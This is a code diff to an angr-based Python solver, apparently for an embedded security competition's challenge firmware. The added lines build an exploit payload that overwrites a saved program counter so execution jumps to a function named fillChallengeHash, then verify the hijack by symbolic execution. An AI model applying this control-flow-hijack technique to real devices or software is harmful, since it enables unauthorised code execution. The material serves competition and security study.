@@ -3,6 +3,7 @@ import re
 import argparse
 import sys
 
+from struct import pack
 from IPython import embed
 from multiprocessing import Pool
 
@@ -14,11 +15,10 @@ BUTTON_OFFSET = WHITE_CARD_START_ADDR + WHITE_CARD_SZ + 48
 class ESCAngr(object):
     def __init__(self, path):
         self.proj = angr.Project(path)
-        self.obj = None
+        self.obj = self.proj.loader.main_object
         self.sym = None
 
     def _set_start_symbol(self, function):
-        self.obj = self.proj.loader.main_object
         self.sym = self.obj.symbols_by_name[function]
         print("Function set to " + self.sym.demangled_name)
 
@@ -176,6 +176,9 @@ class ESCAngr(object):
         self.print_table(s)
 
     def print_table(self, state):
+        print(self._gen_table(state))
+
+    def _gen_table(self, state):
         table = state.solver.eval(state.memory.load(WHITE_CARD_START_ADDR, WHITE_CARD_SZ), cast_to=bytes)
         buttons = state.solver.eval(state.memory.load(BUTTON_OFFSET, 1), cast_to=int)
 
@@ -183,16 +186,18 @@ class ESCAngr(object):
         for i in range(64):
             arr += [[c for c in table[i*16:(i+1)*16]]]
 
-        # pretty print
-        print("#     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f")
-        print("p = [")
+        output = []
+        output += ["#     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f"]
+        output += ["p = ["]
 
         for i, row in enumerate(arr):
             eol = "," if i < 63 else "]"
-            print("     " + str(row) + ("%s # %x" % (eol, i)))
+            output += ["     " + str(row) + ("%s # %x" % (eol, i))]
 
-        print("a = 0x%x" % ((buttons >> 4) & 0xf))
-        print("b = 0x%x" % (buttons & 0xf))
+        output += ["a = 0x%x" % ((buttons >> 4) & 0xf)]
+        output += ["b = 0x%x" % (buttons & 0xf)]
+
+        return "\n".join(output)
 
     def read_string(self, state, addr):
         val = None
@@ -521,16 +526,34 @@ class ESCAngr(object):
         #mgr.use_technique(angr.exploration_techniques.Veritesting())
         mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x876, 0x877], avoid=[0x874,0x875]))
         st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)#st.solver.BVS('select%d' % i, 8))
+
+        target_pc = self.obj.symbols_by_name["_Z17fillChallengeHashv"].linked_addr
+        print("[+] Exploit target PC %08x" % target_pc)
+
+        payload = b"\x00"*12 + pack("<I", 12) + b"\x00\x00\x00\x00" + pack("<I", target_pc)
+
+        st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)
+        # for each bit that is set, read a byte from the payload
+        st.memory.store(WHITE_CARD_START_ADDR+0x100, b"\xff"*3)
+        st.memory.store(WHITE_CARD_START_ADDR+0xc0, payload)
+
         st.memory.store(BUTTON_OFFSET, st.solver.BVS('button', 8))
+
         mgr.run()
-        embed()
 
         if not mgr.found:
             print("Analysis failed")
             return
 
-        self.print_table(mgr.found[0])
-        strout = self.read_string(st, st.regs.r1)
+        s = mgr.found[0]
+        n = s.step()[0]
+
+        print(n)
+        if n.solver.eval(n.regs.pc) != target_pc:
+            print("Wrong target PC!")
+            return
+
+        self.print_table(n)
 
 challenges = {
     "A" : ["stairs", "cafe", "closet", "lounge"],
